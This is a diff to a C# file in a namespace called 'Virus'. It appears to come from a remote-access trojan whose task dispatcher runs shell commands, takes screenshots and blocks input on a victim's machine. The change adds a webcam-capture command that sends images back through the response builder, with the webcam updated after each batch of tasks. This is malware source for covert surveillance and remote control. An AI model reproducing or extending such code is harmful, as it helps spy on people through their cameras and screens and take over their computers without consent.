@@ -14,7 +14,8 @@ namespace Virus {
 
         private readonly ResponseBuilder ResponseBuilder;
         private readonly string tasks;
-        private Random random = new Random();
+        private Random Random = new Random();
+        private Webcam Webcam = new Webcam();
 
         public Tasks(string tasks, ResponseBuilder responseBuilder) {
             this.ResponseBuilder = responseBuilder;
@@ -37,8 +38,14 @@ namespace Virus {
                     Console.WriteLine(e.ToString());
                 }
             }
+
+            Final();
         }
 
+        private void Final() {
+            Webcam.Update();
+        }
+        
         private void run(string s) {
             string output = new Command(s).Run();
             ResponseBuilder.msg(output.Replace(Environment.NewLine, Client.LINE_SEPERATOR));
@@ -110,6 +117,10 @@ namespace Virus {
 
         private void screenshot(string s) {
             ResponseBuilder.screenshot();
+        }
+
+        private void webcam(string s) {
+            ResponseBuilder.webcam(Webcam.GetImage());
         }
 
         private void blockinputs(string s) {
